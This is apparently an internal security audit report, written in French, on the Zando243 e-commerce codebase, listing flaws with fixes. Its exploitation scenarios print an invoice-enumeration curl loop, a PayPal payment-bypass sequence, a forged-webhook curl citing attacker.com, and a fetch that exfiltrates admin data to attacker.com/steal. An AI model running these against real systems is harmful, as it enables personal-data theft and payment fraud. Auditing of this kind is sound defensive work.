# SAST v2 — Audit de Sécurité Approfondi Zando243

**Date :** 2026-04-25
**Périmètre :** Analyse exhaustive de tout le codebase — controllers, services, middlewares, config, routes
**Méthode :** Analyse statique manuelle + traçage de flux de données de bout en bout
**Comparatif :** 8 failles du rapport précédent (2026-03-29) ont été corrigées. 3 nouvelles failles critiques découvertes. 9 failles antérieures persistent.

---

## Progression depuis le rapport précédent

| Faille | Statut |
|--------|--------|
| C-1 — Tokens exposés dans flash | ✅ CORRIGÉ |
| C-2 — Secrets JWT fallback faibles | ✅ CORRIGÉ (`requireSecret` lève erreur en prod) |
| C-3 — Algorithm confusion JWT | ✅ CORRIGÉ (`algorithms: ["HS256"]`) |
| E-6 — Mots de passe en clair dans logs | ✅ CORRIGÉ (`redactBody`) |
| E-7 — Stack trace en production | ✅ CORRIGÉ (`env.isProd` guard) |
| M-1 — Rate limit login trop permissif | ✅ CORRIGÉ (5 tentatives) |
| M-2 — `trust proxy: true` | ✅ CORRIGÉ (`trust proxy: 1`) |
| M-3 — Énumération utilisateurs | ✅ CORRIGÉ (message uniforme) |
| E-1/E-2 — Mass assignment adresses | ⚠️ DÉPLACÉ vers service, toujours présent |
| E-3 — Mass assignment produits | ❌ PERSISTANT |
| E-4 — avatarUrl non validée | ❌ PERSISTANT |
| E-5 — Image URL admin non validée | ❌ PERSISTANT |
| M-4 — LIKE wildcard | ❌ PERSISTANT |
| F-1/F-2/F-3/F-4 — CSP/CORS/Cookies | ❌ PERSISTANTS |

---

---

# CRITIQUE — NOUVELLES FAILLES

---

## N-C1 — Factures PDF accessibles sans authentification (IDOR massif + fuite PII)

* **Fichier :** `app.js:57`
* **Sévérité :** CRITIQUE
* **Catégorie :** `idor` / `data_exposure`
* **Confidence :** 10/10

```javascript
// app.js — ligne 57
app.use("/invoices", express.static(path.join(__dirname, "storage/invoices")));
```

```javascript
// invoiceService.js — ligne 12-13
const filename = `${order.orderNumber}.pdf`;           // ex: ORD-2026-14273.pdf
const filepath = path.join(env.invoiceDir, filename);
```

**Description :**
Les factures PDF sont générées dans `storage/invoices/ORD-YYYY-NNNNN.pdf` et servies via un middleware `express.static` **sans aucune vérification d'authentification**. La numérotation est séquentielle et prédictible : préfixe `ORD-`, année à 4 chiffres, puis un nombre à 5 chiffres tiré au sort entre 10000 et 99999 (`Math.floor(10000 + Math.random() * 90000)`). Chaque facture contient : prénom, nom, email, téléphone, adresse de livraison complète, liste des articles achetés, total payé.

**Scénario d'exploitation :**
Un attaquant non authentifié peut énumérer et télécharger les factures de tous les clients :

```bash
# Script d'énumération — aucun cookie requis
for i in $(seq 10000 99999); do
  curl -s -o "ORD-2026-${i}.pdf" "https://zando243.com/invoices/ORD-2026-${i}.pdf"
done
```

En 30 minutes de scraping, l'attaquant récupère l'ensemble des données personnelles de tous les clients (violation RGPD massive).

**Correction :**

```javascript
// Supprimer la ligne dans app.js :
// app.use("/invoices", express.static(...));

// Créer une route authentifiée dans orderRoutes.js :
router.get("/:id/invoice", requireAuth, asyncHandler(async (req, res) => {
  const order = await models.Order.findOne({
    where: { id: req.params.id, userId: req.user.id }
  });
  if (!order) return res.status(404).end();
  const filepath = path.join(env.invoiceDir, `${order.orderNumber}.pdf`);
  if (!fs.existsSync(filepath)) return res.status(404).end();
  res.sendFile(filepath);
}));
```

---

## N-C2 — Contournement de paiement PayPal (Payment Bypass)

* **Fichier :** `src/controllers/paymentController.js:169-202`
* **Sévérité :** CRITIQUE
* **Catégorie :** `authorization_bypass` / `payment_fraud`
* **Confidence :** 9/10

```javascript
// paymentController.js — capturePayPalOrderForSdk
const paypalOrderId = req.body?.paypalOrderId;   // contrôlé par l'attaquant
const localOrderId  = req.body?.localOrderId;    // contrôlé par l'attaquant

const order = await models.Order.findOne({ where: { id: localOrderId, userId: req.user.id } });
if (!order) return res.status(404).json({ ok: false, error: "ORDER_NOT_FOUND" });

// ❌ AUCUNE vérification que paypalOrderId === order.paymentReference
const captured = await captureCheckoutOrder(paypalOrderId);

if (captured?.status === "COMPLETED") {
  await markOrderAsPaid(order.id, { provider: "PAYPAL", reference: paypalOrderId });
  // → commande marquée PAYÉE, quel que soit le montant réellement capturé
}
```

**Description :**
La fonction `capturePayPalOrderForSdk` reçoit un `paypalOrderId` et un `localOrderId` depuis le corps de la requête. Elle trouve la commande locale par `localOrderId` (filtré sur `userId` — correct), mais **ne vérifie jamais que `paypalOrderId` correspond au champ `order.paymentReference`** de cette commande. La validation du paiement dépend uniquement du statut de la capture PayPal (`COMPLETED`), sans vérification du montant capturé.

**Scénario d'exploitation (pas à pas) :**

```
Étape 1 — Créer une commande chère
  POST /payments/paypal/sdk/create-order { cartItems: [item à $500] }
  → localOrderId_A = "uuid-expensive-order"
  → order.paymentReference = null (pas encore créé via PayPal)

Étape 2 — Créer une commande bon marché depuis un autre panier
  POST /payments/paypal/sdk/create-order { localOrderId: null, doorDelivery: false }
  (panier avec un article à $1)
  → localOrderId_B = "uuid-cheap-order"

Étape 3 — Obtenir un paypalOrderId pour la commande à $1
  POST /payments/paypal/sdk/create-order { localOrderId: "uuid-cheap-order" }
  → paypalOrderId_B = "PAYPAL-ORDER-1-DOLLAR"
  → order B: paymentReference = "PAYPAL-ORDER-1-DOLLAR"

Étape 4 — Capturer en croisant les IDs
  POST /payments/paypal/sdk/capture-order {
    localOrderId: "uuid-expensive-order",   ← commande à $500
    paypalOrderId: "PAYPAL-ORDER-1-DOLLAR"  ← transaction à $1
  }

Résultat :
  ✅ PayPal capture 1$ (succès, status COMPLETED)
  ✅ Notre système marque la commande à 500$ comme PAYÉE
  ✅ L'attaquant reçoit sa commande de 500$ pour 1$
```

**Correction :**

```javascript
const capturePayPalOrderForSdk = asyncHandler(async (req, res) => {
  const paypalOrderId = req.body?.paypalOrderId;
  const localOrderId  = req.body?.localOrderId;

  if (!paypalOrderId || !localOrderId) {
    return res.status(400).json({ ok: false, error: "MISSING_PAYPAL_OR_LOCAL_ORDER_ID" });
  }

  const order = await models.Order.findOne({ where: { id: localOrderId, userId: req.user.id } });
  if (!order) return res.status(404).json({ ok: false, error: "ORDER_NOT_FOUND" });

  // ✅ AJOUTER : vérification que le paypalOrderId correspond à la commande
  if (order.paymentReference && order.paymentReference !== paypalOrderId) {
    return res.status(400).json({ ok: false, error: "PAYPAL_ORDER_MISMATCH" });
  }

  // ... reste du code
});
```

---

## N-C3 — Webhook PayPal : cert_url attaquant-contrôlée transmise à l'API PayPal (Bypass de signature)

* **Fichier :** `src/services/paypalService.js:90-112`
* **Sévérité :** ÉLEVÉ (potentiel CRITIQUE selon configuration PayPal)
* **Catégorie :** `webhook_forgery` / `signature_bypass`
* **Confidence :** 8/10

```javascript
async function verifyWebhookSignature(req) {
  if (!env.paypal.webhookId) return false;
  const token = await getAccessToken();
  const body = req.body || {};
  const response = await fetch(`${env.paypal.baseUrl}/v1/notifications/verify-webhook-signature`, {
    method: "POST",
    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
    body: JSON.stringify({
      transmission_id:   req.headers["paypal-transmission-id"],
      transmission_time: req.headers["paypal-transmission-time"],
      cert_url:          req.headers["paypal-cert-url"],      // ← ATTAQUANT-CONTRÔLÉ
      auth_algo:         req.headers["paypal-auth-algo"],
      transmission_sig:  req.headers["paypal-transmission-sig"],
      webhook_id: env.paypal.webhookId,
      webhook_event: body
    })
  });
  const data = await response.json().catch(() => ({}));
  return response.ok && data.verification_status === "SUCCESS";
}
```

**Description :**
Le header `paypal-cert-url` est entièrement contrôlé par l'attaquant et transmis sans aucune validation à l'API de vérification PayPal. PayPal utilise cette URL pour récupérer le certificat TLS permettant de valider la signature de transmission. Un attaquant peut pointer vers un certificat forgé sur son propre serveur. Si PayPal valide sans restreindre le domaine, la vérification retourne `SUCCESS`, et tout événement webhook forgé est accepté — permettant de déclencher `markOrderAsPaid` sans paiement réel.

**Scénario d'exploitation :**

```bash
# Attaquant envoie une fausse notification de paiement
curl -X POST https://zando243.com/payments/paypal/webhook \
  -H "Content-Type: application/json" \
  -H "paypal-cert-url: https://attacker.com/forged-cert.pem" \
  -H "paypal-transmission-id: fake-id" \
  -H "paypal-transmission-sig: <signature forgée avec le cert attaquant>" \
  -d '{
    "event_type": "PAYMENT.CAPTURE.COMPLETED",
    "resource": { "id": "PAYPAL-ORDER-ID-CIBLE" }
  }'
# Si PayPal accepte le cert_url sans validation de domaine → commande marquée PAYÉE
```

**Correction :**

```javascript
function validateCertUrl(certUrl) {
  try {
    const url = new URL(certUrl);
    if (url.protocol !== "https:") return false;
    // PayPal émet ses certs depuis ces domaines uniquement
    const allowed = /^(api\.paypal\.com|api-m\.paypal\.com|www\.paypalobjects\.com)$/;
    return allowed.test(url.hostname);
  } catch (_) {
    return false;
  }
}

async function verifyWebhookSignature(req) {
  if (!env.paypal.webhookId) return false;
  const certUrl = req.headers["paypal-cert-url"];
  if (!validateCertUrl(certUrl)) return false;   // ← Rejeter immédiatement
  // ... reste du code
}
```

---

---

# ÉLEVÉ — FAILLES PERSISTANTES (non corrigées depuis le rapport précédent)

---

## P-E1 — Mass Assignment dans createUserAddress et updateUserAddress

* **Fichier :** `src/services/accountService.js:40-44, 58-61`
* **Sévérité :** ÉLEVÉ
* **Catégorie :** `mass_assignment`
* **Confidence :** 9/10

```javascript
// accountService.js — createUserAddress (ligne 40-44)
return models.Address.create({
  ...payload,          // ← tout req.body déversé sur le modèle
  userId,
  isDefault: Boolean(payload.isDefault)
});

// accountService.js — updateUserAddress (ligne 58-61)
Object.assign(address, {
  ...payload,          // ← tout req.body déversé sur le modèle
  isDefault: Boolean(payload.isDefault)
});
await address.save();
```

**Description :**
Le `req.body` est passé directement depuis le controller (`accountController.js:22, 28`) vers le service, qui l'étale (`...payload`) sur le modèle Sequelize. Un utilisateur authentifié peut injecter des champs arbitraires du modèle Address non prévus par l'application.

**Scénario d'exploitation :**

```bash
# Changer l'ownership d'une adresse (vol d'adresse d'un autre user)
POST /account/addresses/some-address-id
Content-Type: application/x-www-form-urlencoded
label=Pirated&street=Rue+Test&city=Kinshasa&country=RDC&userId=VICTIM-UUID
```

Le champ `userId` étant forcé dans le `.create()`, l'adresse créée appartiendrait à la victime, pas à l'attaquant. À la création, `userId` est réécrit par le paramètre de la fonction — mais d'autres champs du modèle (ex: `id`) peuvent être injectés.

**Correction :**

```javascript
// accountService.js
async function createUserAddress(userId, payload) {
  const models = defineModels();
  const data = {
    label:        payload.label,
    number:       payload.number || null,
    street:       payload.street,
    neighborhood: payload.neighborhood || null,
    municipality: payload.municipality || null,
    city:         payload.city,
    country:      payload.country,
    userId,
    isDefault:    Boolean(payload.isDefault)
  };
  if (data.isDefault) {
    await models.Address.update({ isDefault: false }, { where: { userId } });
  }
  return models.Address.create(data);
}
```

---

## P-E2 — avatarUrl acceptée sans validation de schéma (XSS potentiel)

* **Fichier :** `src/services/accountService.js:28`
* **Sévérité :** ÉLEVÉ
* **Catégorie :** `xss`
* **Confidence :** 8/10

```javascript
// accountService.js — updateUserProfile (ligne 28)
Object.assign(user, {
  firstName: payload.firstName,
  lastName:  payload.lastName,
  email:     payload.email.toLowerCase(),
  phone:     payload.phone || null,
  avatarUrl: payload.avatarUrl || null    // ← aucune validation
});
```

**Description :**
Aucune validation du schéma de l'URL avatar. Si un template EJS rend l'avatar dans un attribut `href` (`<a href="<%= user.avatarUrl %>">`), le schéma `javascript:` s'exécute au clic. La fonction `deepSanitize` ne filtre que `<` et `>` — `javascript:alert(1)` passe sans modification. Stocké en base, l'XSS persiste pour toute la session de l'utilisateur.

**Correction :**

```javascript
function parseHttpsUrl(raw) {
  if (!raw) return null;
  try {
    const u = new URL(raw);
    return u.protocol === "https:" ? raw : null;
  } catch (_) { return null; }
}

avatarUrl: parseHttpsUrl(payload.avatarUrl)
```

---

## P-E3 — Image URL Produit sans validation de schéma (XSS via panel admin)

* **Fichier :** `src/controllers/adminController.js:97, 118, 175`
* **Sévérité :** ÉLEVÉ
* **Catégorie :** `xss` / `stored_xss`
* **Confidence :** 8/10

```javascript
// adminController.js — addProductImage (ligne 94-100)
await models.ProductImage.create({
  productId: product.id,
  variantId,
  url: req.body.url,         // ← aucune validation de schéma
  isMain,
  position: Number(req.body.position || 0)
});

// adminController.js — updateProductImage (ligne 117-123)
await image.update({
  url: req.body.url || image.url,   // ← aucune validation de schéma
  ...
});

// adminController.js — createProduct (ligne 175)
if (req.body.imageUrl) {
  await models.ProductImage.create({ productId: product.id, url: req.body.imageUrl, isMain: true, position: 0 });
  // ← req.body.imageUrl non validé
}
```

**Description :**
Trois points d'entrée permettent d'injecter des URLs `javascript:` ou `data:` dans les images produit. Un admin compromis (session volée, CSRF réussi contre l'admin) peut injecter une URL malicieuse visible par tous les visiteurs affichant ce produit.

**Correction :** Appliquer la même validation `parseHttpsUrl()` sur toutes les URLs d'images.

---

## P-E4 — Mass Assignment dans createProduct et updateProduct

* **Fichier :** `src/controllers/adminController.js:174, 193`
* **Sévérité :** ÉLEVÉ (contexte admin, mais impact sur l'intégrité des données)
* **Catégorie :** `mass_assignment`
* **Confidence :** 9/10

```javascript
// createProduct (ligne 174)
const product = await models.Product.create({
  ...req.body,                      // ← spread complet
  slug: toSlug(req.body.name),
  keywords: (req.body.keywords || "").split(",").map(s => s.trim()).filter(Boolean)
});

// updateProduct (ligne 193)
Object.assign(product, {
  ...req.body,                      // ← spread complet
  slug: toSlug(req.body.name || product.name),
  keywords: ...
});
await product.save();
```

**Description :**
Un administrateur (ou une session admin compromise) peut injecter des champs calculés comme `avgRating`, `popularityScore`, `countReviews`, `finalPrice` ou même `id`. Cela permet de manipuler le classement produits, fausser les avis affichés, ou écraser des données de stock.

**Correction :** Définir une whitelist explicite dans `productValidators` et utiliser uniquement ces champs dans `create()`/`update()`.

---

---

# MOYEN — FAILLES PERSISTANTES

---

## P-M1 — CORS : toute origine reflétée avec credentials (Cross-Origin Data Exfiltration)

* **Fichier :** `app.js:37`
* **Sévérité :** MOYEN (ÉLEVÉ si endpoints JSON sensibles accessibles via GET)
* **Catégorie :** `cors_misconfiguration`
* **Confidence :** 9/10

```javascript
app.use(cors({ origin: true, credentials: true }));
// origin: true → Express reflète n'importe quel Origin comme autorisé
```

**Description :**
Avec `origin: true`, Express reflète l'en-tête `Origin` de chaque requête dans la réponse CORS. Combiné à `credentials: true`, n'importe quel site web peut effectuer des requêtes authentifiées (avec les cookies de session) vers cette API **et lire les réponses**. Ce n'est pas seulement une protection CSRF affaiblie — c'est une exfiltration de données cross-origin activée.

**Scénario :**

```javascript
// Site attaquant — exfiltration des stats admin
fetch("https://zando243.com/admin/stats", { credentials: "include" })
  .then(r => r.json())
  .then(data => fetch("https://attacker.com/steal", {
    method: "POST",
    body: JSON.stringify(data)
  }));
// Si la victime est admin et visite le site attaquant → données admin exfiltrées
```

**Correction :**

```javascript
const allowedOrigins = (process.env.ALLOWED_ORIGINS || env.appUrl)
  .split(",").map(s => s.trim()).filter(Boolean);

app.use(cors({
  origin: (origin, cb) => {
    if (!origin || allowedOrigins.includes(origin)) return cb(null, true);
    cb(new Error("CORS: origine non autorisée"));
  },
  credentials: true
}));
```

---

## P-M2 — Injection LIKE SQL — Wildcard non échappé

* **Fichier :** `src/services/auditLogService.js:60-64`
* **Sévérité :** MOYEN (admin uniquement)
* **Catégorie :** `sql_like_injection`
* **Confidence :** 8/10

```javascript
if (filters.actorEmail) where.actorEmail = { [Op.like]: `%${filters.actorEmail}%` };
if (filters.q) {
  where[Op.or] = [
    { message: { [Op.like]: `%${filters.q}%` } },
    { action:  { [Op.like]: `%${filters.q}%` } }
  ];
}
```

**Description :**
Les caractères `%` et `_` ont une signification spéciale dans SQL LIKE. L'admin peut envoyer `actorEmail=%` pour forcer un scan complet de la table AuditLog, contournant le filtre prévu.

**Correction :**

```javascript
function escapeLike(str) {
  return String(str).replace(/\\/g, "\\\\").replace(/%/g, "\\%").replace(/_/g, "\\_");
}
if (filters.actorEmail) {
  where.actorEmail = { [Op.like]: `%${escapeLike(filters.actorEmail)}%` };
}
```

---

---

# FAIBLE — FAILLES PERSISTANTES (hygiene de sécurité)

---

## P-F1 — Content Security Policy désactivée

* **Fichier :** `app.js:31-34`
* **Sévérité :** FAIBLE

```javascript
app.use(helmet({ contentSecurityPolicy: false }));
```

Sans CSP, tout XSS résiduel peut exécuter du JavaScript arbitraire. Activer avec une politique stricte.

---

## P-F2 — Cookies d'authentification avec `sameSite: "lax"` au lieu de `"strict"`

* **Fichier :** `src/services/authService.js:11`
* **Sévérité :** FAIBLE

`sameSite: "lax"` autorise l'envoi des cookies lors des navigations GET cross-site (clics sur liens). `"strict"` est plus sûr pour un site e-commerce.

---

## P-F3 — Durée de session cookie de 7 jours

* **Fichier :** `app.js:49`
* **Sévérité :** FAIBLE

Un cookie de session volé reste exploitable 7 jours. Réduire à 4-8 heures.

---

## P-F4 — Sanitization insuffisante (seulement `<` et `>` filtrés)

* **Fichier :** `src/middlewares/validators.js:6`
* **Sévérité :** FAIBLE

```javascript
return value.replace(/[<>]/g, "").trim();
```

N'échappe pas `"`, `'`, ni les encodages HTML (`&#60;`). Ne doit pas être la seule défense. Toujours utiliser `<%= %>` dans EJS, jamais `<%-` pour des données utilisateur.

---

---

# Matrice des risques consolidée

| ID | Fichier | Ligne(s) | Niveau | Statut | Vecteur |
|----|---------|----------|--------|--------|---------|
| N-C1 | `app.js` | 57 | **CRITIQUE** | 🆕 Nouveau | Factures PDF sans auth |
| N-C2 | `src/controllers/paymentController.js` | 169–202 | **CRITIQUE** | 🆕 Nouveau | Payment bypass PayPal |
| N-C3 | `src/services/paypalService.js` | 90–112 | **ÉLEVÉ** | 🆕 Nouveau | Webhook forgery (cert_url) |
| P-E1 | `src/services/accountService.js` | 40–61 | **ÉLEVÉ** | ⚠️ Persistant | Mass assignment adresses |
| P-E2 | `src/services/accountService.js` | 28 | **ÉLEVÉ** | ⚠️ Persistant | XSS via avatarUrl |
| P-E3 | `src/controllers/adminController.js` | 97, 118, 175 | **ÉLEVÉ** | ⚠️ Persistant | XSS via image URL |
| P-E4 | `src/controllers/adminController.js` | 174, 193 | **ÉLEVÉ** | ⚠️ Persistant | Mass assignment produits |
| P-M1 | `app.js` | 37 | **MOYEN** | ⚠️ Persistant | CORS + credentials |
| P-M2 | `src/services/auditLogService.js` | 60–64 | **MOYEN** | ⚠️ Persistant | LIKE wildcard |
| P-F1 | `app.js` | 31 | **FAIBLE** | ⚠️ Persistant | CSP désactivée |
| P-F2 | `src/services/authService.js` | 11 | **FAIBLE** | ⚠️ Persistant | sameSite: lax |
| P-F3 | `app.js` | 49 | **FAIBLE** | ⚠️ Persistant | Session 7 jours |
| P-F4 | `src/middlewares/validators.js` | 6 | **FAIBLE** | ⚠️ Persistant | Sanitization partielle |

---

# Plan de remédiation prioritaire

## 🔴 Sprint immédiat (avant tout déploiement)

1. **N-C1** — Supprimer `app.use("/invoices", express.static(...))`. Créer route authentifiée avec vérification ownership. C'est la faille la plus simple à exploiter et la plus grave (RGPD).
2. **N-C2** — Ajouter la vérification `paypalOrderId === order.paymentReference` dans `capturePayPalOrderForSdk`. Une ligne de code, impact financier direct.
3. **N-C3** — Valider que `cert_url` appartient à `*.paypal.com` avant de l'envoyer à l'API PayPal.

## 🟠 Sprint 48h

4. **P-E1** — Remplacer `...payload` par whitelists explicites dans `createUserAddress` et `updateUserAddress`.
5. **P-E2/P-E3** — Valider le schéma `https://` sur toutes les URLs d'images et d'avatar.
6. **P-E4** — Whitelist explicite dans `createProduct` et `updateProduct`.

## 🟡 Sprint semaine

7. **P-M1** — Restreindre CORS à `env.appUrl` uniquement.
8. **P-M2** — Échapper les wildcards LIKE.
9. **P-F1** — Activer CSP dans helmet avec une politique adaptée à EJS.
10. **P-F2/P-F3** — `sameSite: "strict"`, réduire `maxAge` session à 4h.

---

*Rapport généré par analyse statique manuelle approfondie — Zando243 — 2026-04-25*
*3 nouvelles failles découvertes · 8 failles précédentes corrigées · 9 failles persistent*
